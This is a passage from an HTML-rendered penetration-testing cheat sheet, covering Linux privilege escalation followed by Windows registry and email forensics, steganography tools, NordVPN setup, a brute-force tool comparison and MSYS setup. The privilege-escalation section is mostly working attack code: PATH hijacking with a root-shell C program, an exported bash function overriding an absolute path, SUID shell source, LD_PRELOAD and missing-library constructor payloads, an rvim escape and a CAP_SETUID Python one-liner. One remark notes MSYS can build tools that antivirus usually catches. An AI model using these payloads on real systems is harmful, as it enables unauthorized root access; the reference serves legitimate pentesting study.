./pwn &lt;os-num&gt; &lt;path-to-suid-pic-elf&gt;
<span class="c"># Try with those with longer paths</span></code></pre></div></div></li> <li><a href="https://blog.aquasec.com/bugs-gone-wild-container-stack-clash-and-cve-2017-1000253">More info</a></li> </ul> <h3 id="linux--elf-vulnerabilities--environment-tampering"> <a href="#linux--elf-vulnerabilities--environment-tampering" class="anchor-heading" aria-labelledby="linux--elf-vulnerabilities--environment-tampering"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Environment Tampering </h3> <h4 id="linux--elf-vulnerabilities--environment-tampering--identification"> <a href="#linux--elf-vulnerabilities--environment-tampering--identification" class="anchor-heading" aria-labelledby="linux--elf-vulnerabilities--environment-tampering--identification"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Identification </h4> <ul> <li>Check calls made by the SUID:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings /usr/bin/sudo | less
<span class="c"># Relative calls don't have a path</span>
<span class="c"># Absolute calls have a path</span>

<span class="c"># Also check</span>
ldd /usr/bin/sudo</code></pre></div></div></li> </ul> <h4 id="linux--elf-vulnerabilities--environment-tampering--relative-references"> <a href="#linux--elf-vulnerabilities--environment-tampering--relative-references" class="anchor-heading" aria-labelledby="linux--elf-vulnerabilities--environment-tampering--relative-references"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Relative References </h4> <ul> <li>Tamper the PATH:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>

<span class="c"># Create an evil executable with</span>
<span class="c"># the same name as the reference</span>
<span class="nb">echo</span> <span class="s1">'int main() { setgid(0); setuid(0); system("/bin/sh"); return 0; }'</span> <span class="o">&gt;</span> /tmp/setresuid.c

gcc /tmp/setresuid.c <span class="nt">-o</span> /tmp/setresuid</code></pre></div></div></li> <li>Execute the binary</li> <li>Check that the permissions are preserved<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-p</span></code></pre></div></div></li> </ul> <h4 id="linux--elf-vulnerabilities--environment-tampering--absolute-references"> <a href="#linux--elf-vulnerabilities--environment-tampering--absolute-references" class="anchor-heading" aria-labelledby="linux--elf-vulnerabilities--environment-tampering--absolute-references"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Absolute References </h4> <ul> <li>Create a function:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># It shall have the same name</span>
/usr/sbin/service<span class="o">()</span> <span class="o">{</span> <span class="nb">cp</span> /bin/bash /tmp <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +s /tmp/bash <span class="o">&amp;&amp;</span> /tmp/bash <span class="nt">-p</span><span class="p">;</span> <span class="o">}</span>

<span class="c"># Export the function</span>
<span class="nb">export</span> <span class="nt">-f</span> /usr/sbin/service</code></pre></div></div></li> <li>Execute the binary</li> <li>Check that the permissions are preserved<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-p</span></code></pre></div></div></li> </ul> <h2 id="linux--suid-creation"> <a href="#linux--suid-creation" class="anchor-heading" aria-labelledby="linux--suid-creation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SUID Creation </h2> <h3 id="linux--suid-creation--set-suid-bit"> <a href="#linux--suid-creation--set-suid-bit" class="anchor-heading" aria-labelledby="linux--suid-creation--set-suid-bit"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Set SUID bit </h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>a+s &lt;file&gt;</code></pre></div></div> <h3 id="linux--suid-creation--elf"> <a href="#linux--suid-creation--elf" class="anchor-heading" aria-labelledby="linux--suid-creation--elf"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> ELF </h3> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
  <span class="c1">// Use exec if system uses rshell</span>
  <span class="c1">// execv("/bin/sh", NULL);</span>
  <span class="c1">// execl("/bin/sh", NULL);</span>
  <span class="c1">// execlp("/bin/sh", NULL);</span>
  <span class="c1">// execle("/bin/sh", NULL, NULL);</span>
  <span class="c1">// execvp("/bin/sh", NULL);</span>
  <span class="c1">// execve("/bin/sh", NULL, NULL);</span>
  <span class="c1">// execvP("/bin/sh", NULL, NULL);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// gcc -o suid suid.c</span>
<span class="c1">// https://stackoverflow.com/a/20823413</span></code></pre></div></div> <h3 id="linux--suid-creation--so-library"> <a href="#linux--suid-creation--so-library" class="anchor-heading" aria-labelledby="linux--suid-creation--so-library"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SO Library </h3> <h4 id="linux--suid-creation--so-library--ld_preload"> <a href="#linux--suid-creation--so-library--ld_preload" class="anchor-heading" aria-labelledby="linux--suid-creation--so-library--ld_preload"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> LD_PRELOAD </h4> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="c1">// In old systems use:</span>
<span class="c1">// void _init() {</span>

<span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="n">my_init</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">unsetenv</span><span class="p">(</span><span class="s">"LD_PRELOAD"</span><span class="p">);</span>
  <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
  <span class="c1">// Use exec if system uses rshell</span>
  <span class="c1">// execv("/bin/sh", NULL);</span>
  <span class="c1">// execl("/bin/sh", NULL);</span>
  <span class="c1">// execlp("/bin/sh", NULL);</span>
  <span class="c1">// execle("/bin/sh", NULL, NULL);</span>
  <span class="c1">// execvp("/bin/sh", NULL);</span>
  <span class="c1">// execve("/bin/sh", NULL, NULL);</span>
  <span class="c1">// execvP("/bin/sh", NULL, NULL);</span>
<span class="p">}</span>
<span class="c1">// gcc -shared -fPIC -o suid.so suid.c</span>
<span class="c1">// LD_PRELOAD=suid.so &lt;binary&gt;</span></code></pre></div></div> <h4 id="linux--suid-creation--so-library--missing-library"> <a href="#linux--suid-creation--so-library--missing-library" class="anchor-heading" aria-labelledby="linux--suid-creation--so-library--missing-library"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Missing library </h4> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="c1">// void _init() in old systems</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">inject</span><span class="p">()</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>

<span class="kt">void</span> <span class="nf">inject</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cp /bin/sh /tmp/sh &amp;&amp; chmod a+s /tmp/sh &amp;&amp; /tmp/sh -p"</span><span class="p">);</span>
    <span class="c1">// See above for exec family</span>
<span class="p">}</span>
<span class="c1">// gcc -shared -fPIC -o &lt;lib&gt;.so lib.c</span></code></pre></div></div> <h2 id="linux--tool-privesc"> <a href="#linux--tool-privesc" class="anchor-heading" aria-labelledby="linux--tool-privesc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Tool PrivEsc </h2> <h3 id="linux--tool-privesc--gtfobins"> <a href="#linux--tool-privesc--gtfobins" class="anchor-heading" aria-labelledby="linux--tool-privesc--gtfobins"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> GTFObins </h3> <ul> <li><a href="https://gtfobins.github.io">Site</a> - How to privesc with common tools</li> </ul> <h3 id="linux--tool-privesc--rvim"> <a href="#linux--tool-privesc--rvim" class="anchor-heading" aria-labelledby="linux--tool-privesc--rvim"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> rvim </h3> <ul> <li>In addition to the gtfobins ways, you can use <code>:diffpatch $(sh &lt;&amp;2 &gt;&amp;2)</code> (play with double quotes) as reported <a href="https://github.com/vim/vim/issues/1543">here</a> if <code>vim</code> was compiled without python nor lua support (maybe <code>source</code> also works)</li> </ul> <h2 id="linux--capabilities"> <a href="#linux--capabilities" class="anchor-heading" aria-labelledby="linux--capabilities"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Capabilities </h2> <h3 id="linux--capabilities--info"> <a href="#linux--capabilities--info" class="anchor-heading" aria-labelledby="linux--capabilities--info"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Info </h3> <ul> <li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities">Examples of attack vectors with Caps</a></li> </ul> <h3 id="linux--capabilities--cap_setuid"> <a href="#linux--capabilities--cap_setuid" class="anchor-heading" aria-labelledby="linux--capabilities--cap_setuid"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CAP_SETUID </h3> <h4 id="linux--capabilities--cap_setuid--python"> <a href="#linux--capabilities--cap_setuid--python" class="anchor-heading" aria-labelledby="linux--capabilities--cap_setuid--python"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Python </h4> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import os; os.setuid(0); os.system("/bin/bash");'</span></code></pre></div></div> <h1 id="forensics"> <a href="#forensics" class="anchor-heading" aria-labelledby="forensics"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Forensics </h1> <h2 id="forensics--windows"> <a href="#forensics--windows" class="anchor-heading" aria-labelledby="forensics--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h2> <h3 id="forensics--windows--registry-hives--dat-files"> <a href="#forensics--windows--registry-hives--dat-files" class="anchor-heading" aria-labelledby="forensics--windows--registry-hives--dat-files"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Registry Hives .dat files </h3> <ul> <li>Identify the content of a hive file with <a href="https://github.com/mkorman90/regipy">regipy</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>registry-parse-header &lt;hive.dat&gt;</code></pre></div></div></li> <li>Recover and diff the hive changes:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add -s &lt;secondary-log&gt; if found</span>
registry-transaction-logs NTUSER.DAT <span class="nt">-p</span> NTUSER.DAT.LOG <span class="nt">-o</span> recovered_NTUSER.dat

registry-diff NTUSER.DAT recovered_NTUSER.dat</code></pre></div></div></li> <li>Dump the hive as JSON and browse it:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>registry-dump NTUSER.DAT | jq <span class="nt">-C</span> <span class="nb">.</span> | less <span class="nt">-R</span></code></pre></div></div></li> <li>Run plugins to extract information:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Modest plugins from regipy</span>
<span class="c"># List them: registry-plugins-list</span>
registry-plugins-run UsrClass.dat <span class="nt">-o</span> out.json

<span class="c"># Massive amount from RegRipper</span>
rip <span class="nt">-a</span> <span class="nt">-r</span> &lt;hive.dat&gt; <span class="o">&gt;</span> output.txt</code></pre></div></div></li> <li>Flush transactional log with <a href="https://github.com/Silv3rHorn/4n6_misc/releases/">registryFlush</a></li> <li>Automatically extract information from all hives and save it separately + flush transaction log:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Place rip.exe in %TEMP%</span>
<span class="kd">autoripy</span><span class="err">.exe</span> <span class="nv">%TEMP%</span> <span class="na">-s </span><span class="kd">C</span>:\Windows\System32\config <span class="na">-m </span><span class="kd">C</span>:\Users <span class="na">-r </span><span class="nv">%TEMP%</span>\reports <span class="na">-c </span><span class="kd">all</span> <span class="na">--flush</span></code></pre></div></div></li> </ul> <h3 id="forensics--windows--internet-explorer--dat-files"> <a href="#forensics--windows--internet-explorer--dat-files" class="anchor-heading" aria-labelledby="forensics--windows--internet-explorer--dat-files"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Internet Explorer .dat files </h3> <ul> <li>Dump the content using <a href="https://github.com/bauman/python-pasco">pasco</a> (also check the <a href="https://sourceforge.net/projects/odessa/">odessa</a> version)<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pasco &lt;file.dat&gt;

<span class="c"># Recursively show all in subfolders</span>
<span class="k">for </span>f <span class="k">in</span> <span class="k">**</span>/<span class="k">*</span>.dat<span class="p">;</span> <span class="k">do </span><span class="nb">echo</span><span class="p">;</span> pasco <span class="s2">"</span><span class="nv">$f</span><span class="s2">"</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">"----"</span><span class="p">;</span> <span class="k">done</span></code></pre></div></div></li> </ul> <h3 id="forensics--windows--emails"> <a href="#forensics--windows--emails" class="anchor-heading" aria-labelledby="forensics--windows--emails"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Emails </h3> <h4 id="forensics--windows--emails--dbx"> <a href="#forensics--windows--emails--dbx" class="anchor-heading" aria-labelledby="forensics--windows--emails--dbx"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> DBX </h4> <ul> <li>Extract all DBX files and recover its content:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>f <span class="k">in</span> <span class="k">*</span>.dbx<span class="p">;</span> <span class="k">do </span>undbx <span class="nt">--recover</span> <span class="nv">$f</span><span class="p">;</span> <span class="k">done</span></code></pre></div></div></li> <li>Convert <a href="https://unix.stackexchange.com/a/39247">EML files to MBOX</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># formail is contained in procmail</span>
<span class="k">for </span>f <span class="k">in</span> <span class="k">*</span>.eml<span class="p">;</span> <span class="k">do </span>formail <span class="nt">-b</span> &lt; <span class="nv">$f</span> <span class="o">&gt;</span> <span class="s2">"</span><span class="k">${</span><span class="nv">f</span><span class="p">%.*</span><span class="k">}</span><span class="s2">"</span>.mbox<span class="p">;</span> <span class="k">done</span></code></pre></div></div></li> <li>Open <code>MBOX</code> files in <code>mutt</code>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="k">*</span>.mbox <span class="o">&gt;</span> all.mbox
mutt <span class="nt">-f</span> all.mbox
<span class="c"># Remove duplicates by pressing:</span>
<span class="c">#   D</span>
<span class="c">#   ~=</span>
<span class="c"># View attachments with: v</span>
<span class="c"># Extract attachments with: s</span>
<span class="c">#</span>
<span class="c"># To render HTML check: Tool section</span></code></pre></div></div></li> </ul> <h2 id="forensics--linux"> <a href="#forensics--linux" class="anchor-heading" aria-labelledby="forensics--linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linux </h2> <ul> <li><a href="https://tho-le.medium.com/linux-forensics-some-useful-artifacts-74497dca1ab2">Read this article</a></li> </ul> <h1 id="steganography"> <a href="#steganography" class="anchor-heading" aria-labelledby="steganography"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Steganography </h1> <h2 id="steganography--steghide"> <a href="#steganography--steghide" class="anchor-heading" aria-labelledby="steganography--steghide"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Steghide </h2> <ul> <li><a href="https://github.com/StefanoDeVuono/steghide">Site</a> - Detect/Hide data:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Detect</span>
steghide info &lt;file&gt;</code></pre></div></div></li> </ul> <h2 id="steganography--stegsolve"> <a href="#steganography--stegsolve" class="anchor-heading" aria-labelledby="steganography--stegsolve"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> StegSolve </h2> <ul> <li><a href="https://github.com/Giotino/stegsolve">Site</a> (<a href="https://github.com/Giotino/stegsolve/issues/2">bug</a>) - <a href="http://www.caesum.com/handbook/Stegsolve.jar">Original</a> - Image Analyzer:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> stegosolve.jar
<span class="c"># -Dsun.java2d.uiScale=2.5 - HiDPI</span>
<span class="c"># -Dsun.java2d.dpiaware=false - HiDPI</span>
<span class="c"># GDK_SCALE=2 - HiDPI</span></code></pre></div></div></li> </ul> <h1 id="tricky-configuration"> <a href="#tricky-configuration" class="anchor-heading" aria-labelledby="tricky-configuration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Tricky Configuration </h1> <h2 id="tricky-configuration--vpn"> <a href="#tricky-configuration--vpn" class="anchor-heading" aria-labelledby="tricky-configuration--vpn"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> VPN </h2> <h3 id="tricky-configuration--vpn--nordvpn"> <a href="#tricky-configuration--vpn--nordvpn" class="anchor-heading" aria-labelledby="tricky-configuration--vpn--nordvpn"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> NordVPN </h3> <ul> <li>Debian - add repo and install<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget <span class="s1">'https://repo.nordvpn.com/deb/nordvpn/debian/pool/main/nordvpn-release_1.0.0_all.deb'</span>

dpkg <span class="nt">-i</span> nordvpn-release_1.0.0_all.deb

apt update

apt <span class="nb">install </span>nordvpn
<span class="c"># Review nordvpnd.socket and service</span>

<span class="c"># Consider installing wireguard-tools</span>
<span class="c"># for using nordlynx wg technology</span>

usermod <span class="nt">-aG</span> nordvpn <span class="nv">$USER</span>

<span class="c"># Reload groups for terminal</span>
<span class="nb">sudo</span> <span class="nt">-v</span> <span class="o">&amp;&amp;</span> <span class="nb">exec sudo</span> <span class="nt">-u</span> <span class="nv">$USER</span> <span class="nt">-i</span></code></pre></div></div></li> <li>Log in and whitelist<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Continue from the sudo -u $USER -i</span>

<span class="c"># Consider using iptables-save here</span>

nordvpn login | <span class="nb">awk</span> <span class="s1">'{print $NF}'</span> | xargs firefox

nordvpn account

<span class="c"># Identify the networks to whitelist</span>
ip addr

nordvpn whitelist add subnet &lt;net&gt;/&lt;mask&gt;

<span class="c"># Only if wireguard-tools is installed</span>
nordvpn <span class="nb">set </span>technology nordlynx

nordvpn <span class="nb">set </span>protocol &lt;UDP/TCP&gt;  <span class="c"># UDP</span>

nordvpn <span class="nb">set </span>autoconnect on &lt;country&gt; &lt;city&gt; <span class="c"># Specific servers is possible</span>

nordvpn connect <span class="o">[</span>&lt;country&gt;] <span class="o">[</span>&lt;city&gt;] <span class="c">#Tab</span>

nordvpn <span class="nb">set </span>killswitch on

nordvpn status</code></pre></div></div></li> <li>Disconnect and recover internet<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nordvpn disconnect

<span class="c"># Consider using iptables-restore here</span>
iptables <span class="nt">-F</span>

systemctl stop nordvpn.s<span class="o">{</span>ocket,ervice<span class="o">}</span></code></pre></div></div></li> </ul> <h2 id="tricky-configuration--bruteforce---fuzzing-ranking"> <a href="#tricky-configuration--bruteforce---fuzzing-ranking" class="anchor-heading" aria-labelledby="tricky-configuration--bruteforce---fuzzing-ranking"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bruteforce / Fuzzing Ranking </h2> <ul> <li><b>TLDR</b> Linux - Theoretically &amp; not-benchmarked:<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>medusa &gt; hydra &lt;=&gt; patator &gt; wfuzz &gt; ZAP Dirbuster &gt; dirsearch &gt; dirb &gt;= gobuster* == ffuf* == feroxbuster</code></pre></div></div> <ul> <li><code>&lt;=&gt;</code> In some cases <code>patator</code> is the best <ul> <li>If the server supports <code>keep-alive</code> <ul> <li><code>curl -H &#39;Connection: keep-alive&#39;</code></li> </ul> </li> <li>And the <code>medusa</code> and <code>hydra</code> modules don&#8217;t reuse connections (like HTTP)</li> </ul> </li> <li><code>*</code> Compile via <code>gccgo</code> for native threads</li> <li><code>feroxbuster</code> uses <a href="https://epi052.github.io/feroxbuster-docs/docs/configuration/limit-connections/#a-note-on-green-threads">green threads</a></li> <li>In Windows it is a different story <ul> <li>In a quick test <code>patator</code> vs <code>wfuzz</code> vs <code>ffuf</code> performed in MSYS-MinGW64 the result was:<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf &gt; wfuzz &gt; patator</code></pre></div></div> <ul> <li>Correspondingly <code>ffuf</code> was 2 times faster than <code>wfuzz</code> (3.5min vs 7min)</li> <li><code>patator</code> took 9min</li> </ul> </li> <li>This is due to the different implementation of <code>fork</code>, <code>clone</code> &amp; <code>pthread</code> found in Windows, as well as the task/thread scheduler</li> </ul> </li> </ul> </li> <li>The most performant tool should be <code>medusa</code> (<a href="https://github.com/jmk-foofus/medusa/pull/53">fix</a>) followed by <code>hydra</code> (ignoring protocol optimizations/features that might not be implemented in them)</li> <li>These two tools are written in C, with the major difference being that <code>medusa</code> uses <a href="http://foofus.net/goons/jmk/medusa/medusa-compare.html">pthread vs fork</a> in <code>hydra</code></li> <li>This is multithreading v multiprocessing</li> <li><code>pthread</code> uses less memory</li> <li><code>fork</code> takes advantage of multi-CPU/cores</li> <li>For I/O bound operations <a href="https://stackoverflow.com/a/3046201">use pthread</a></li> <li>For high-level langs in a <a href="https://stackoverflow.com/a/55319297">CPU-bound situation</a> it might be better to use multiprocessing as multiprocessing scheduling is managed by the OS whereas multithreading might be managed by the library (or <a href="https://stackoverflow.com/questions/3044580/multiprocessing-vs-threading-python#comment40131752_3046201">GIL</a>), causing overhead - <a href="https://stackoverflow.com/questions/3044580/multiprocessing-vs-threading-python#comment3117218_3044626">ref</a></li> <li><code>patator</code> uses <a href="https://github.com/lanjelot/patator/blob/master/patator.py#L966">multiprocessing</a> vs <a href="https://github.com/xmendez/wfuzz/blob/master/src/wfuzz/myqueues.py#L10">multithreading</a> used by <code>wfuzz</code></li> <li><code>wfuzz</code> is prone to get killed by the OOMd</li> <li><code>patator</code> tries to reuse TCP connections for all modules and supports <a href="https://github.com/lanjelot/patator/blob/master/patator.py#L3806">HTTP2</a></li> <li><code>medusa</code> and <code>hydra</code> only reuse connections in specific modules (not HTTP, even if <code>medusa</code> <a href="https://github.com/jmk-foofus/medusa/blob/master/src/modsrc/http.c#L684">hardcodes keep-alive</a>) - no HTTP2</li> <li>Note that <a href="https://blog.g0tmi1k.com/dvwa/bruteforce-medium/#Why.is.Hydra.slower.than.Patator.">hydra could be slower than patator</a> due to an unnecessary GET req</li> <li>Regarding Python vs Go, <a href="https://www.doria.fi/handle/10024/181265">it appears</a> to be that some Python libraries might be more performant than goroutines</li> <li>Note that compiling Go programs with <a href="https://stackoverflow.com/a/25811505">gccgo</a> <a href="https://meltware.com/2019/01/16/gccgo-benchmarks-2019.html">may</a> implement <a href="https://stackoverflow.com/a/1739685">the goroutines as pthreads</a> <ul> <li>Also referred in <a href="https://books.google.cz/books?id=scyH562VXZUC&amp;pg=PA151&amp;lpg=PA151&amp;dq=%22gccgo%22+%22system%22+%22thread%22&amp;ots=Mmw9xwqdZE&amp;sig=ACfU3U2WP-fKA0uxL9BewxLhBb9kAgkcgg&amp;hl=en#v=onepage&amp;q=%22gccgo%22%20%22system%22%20%22thread%22&amp;f=false">this book</a></li> <li>Alternatively, set <a href="https://stackoverflow.com/a/14624788">GOMAXPROCS</a> in the env</li> </ul> </li> <li>According to <a href="https://evabssi.com/evaluation-des-performances-doutils-de-bruteforce-durl/">this</a>, <code>patator</code> outperforms all the other high-level parallel tools <ul> <li>But the article doesn&#8217;t say if coroutines have been placed in the same category as threads</li> <li>And it doesn&#8217;t say if Wfuzz PyCurl is <a href="https://wfuzz.readthedocs.io/en/latest/user/installation.html#installation-issues">correctly linked</a></li> </ul> </li> </ul> <h2 id="tricky-configuration--msys-for-windows"> <a href="#tricky-configuration--msys-for-windows" class="anchor-heading" aria-labelledby="tricky-configuration--msys-for-windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> MSYS for Windows </h2> <h3 id="tricky-configuration--msys-for-windows--download"> <a href="#tricky-configuration--msys-for-windows--download" class="anchor-heading" aria-labelledby="tricky-configuration--msys-for-windows--download"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Download </h3> <ul> <li>Using MSYS might be the easiest way to get an unified linux-like environment in Windows</li> <li>In fact, it can be successfully used to build native tools that are usually caught by the AV</li> <li>Get it from <a href="https://www.msys2.org/">msys2.org</a></li> </ul> <h3 id="tricky-configuration--msys-for-windows--python-cryptography---rust-installation"> <a href="#tricky-configuration--msys-for-windows--python-cryptography---rust-installation" class="anchor-heading" aria-labelledby="tricky-configuration--msys-for-windows--python-cryptography---rust-installation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Python Cryptography / Rust Installation </h3> <ul> <li>Installing the <code>cryptography</code> library via <code>pip</code> is ridiculously difficult</li> <li>There&#8217;s the <code>mingw-w64-x86_64-python-cryptography</code> pkg, but it might be outdated</li> <li>First install the following packages:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pacman <span class="nt">-S</span> <span class="nt">--disable-download-timeout</span> mingw-w64-x86_64-gcc mingw-w64-x86_64-python mingw-w64-x86_64-python-pip mingw-w64-x86_64-python-wheel</code></pre></div></div></li> <li>Create a generic python lib via symlink:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> /mingw64/lib/libpython3.<span class="k">*</span>.dll.a /mingw64/lib/libpython3.dll.a</code></pre></div></div></li> <li>Install Rust (mingw one doesn&#8217;t work) - <a href="https://stackoverflow.com/a/47380501">ref</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--proto</span> <span class="s1">'=https'</span> <span class="nt">--tlsv1</span>.2 <span class="nt">-sSf</span> https://sh.rustup.rs | sh</code></pre></div></div></li> <li>Customize the installation (opt 2) to use the following target: <code>x86_64-pc-windows-gnu</code></li> <li>Continue with the installation</li> <li>Create a <code>config</code> file in your cargo home:<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%USERPROFILE%\.cargo\config
---------------------------
[target.x86_64-pc-windows-gnu]
linker = "C:\\msys64\\mingw64\\bin\\gcc.exe"
ar = "C:\\msys64\\mingw64\\bin\\ar.exe"</code></pre></div></div></li> <li>Open a MinGW x64 terminal and add the Rust bin to the PATH (don&#8217;t worry about the exe):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="s2">"/c/Users/</span><span class="nv">$USERNAME</span><span class="s2">/.cargo/bin:</span><span class="nv">$PATH</span><span class="s2">"</span></code></pre></div></div></li> <li>Try to install cryptography:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># You might want to try a venv first</span>
pip <span class="nb">install</span> <span class="nt">--trusted-host</span> pypi.org <span class="nt">--trusted-host</span> files.pythonhosted.org cryptography
<span class="c"># Always try to install the dependencies</span>
